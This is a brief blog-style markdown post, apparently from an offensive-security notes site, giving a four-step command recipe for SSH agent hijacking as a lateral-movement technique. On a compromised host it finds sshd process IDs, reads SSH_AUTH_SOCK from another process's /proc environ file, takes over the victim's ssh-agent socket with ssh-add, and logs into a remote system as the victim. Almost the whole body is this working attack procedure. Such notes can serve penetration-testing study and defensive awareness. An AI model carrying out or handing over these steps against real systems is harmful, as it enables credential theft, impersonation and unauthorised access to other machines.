---
description: >-
    SSH Hijacking technique
title: SSH Hijacking                  # Add title here
date: 2022-08-24 08:00:00 -0600                           # Change the date to match completion date
categories: [02 Lateral Movement, SSH Hijacking]                     # Change Templates to Writeup
tags: [ssh hijacking]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
Step 1: We first determine the SSH process ID of the user on the
compromised host: 
```bash
ps aux |grep sshd
```

Step 2: Determine the SSH_AUTH_SOCK environment variable for the sshd PID:
```bash
grep SSH_AUTH_SOCK /proc/<PID>/environ
```

Step 3: We then hijack the targets ssh-agent socket:

```bash
SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.XXXX ssh-add –l
```


Step 4: Finally, we log into the remote system our victim is logged into as the target: 
```bash
ssh remotesystem -l victim
```
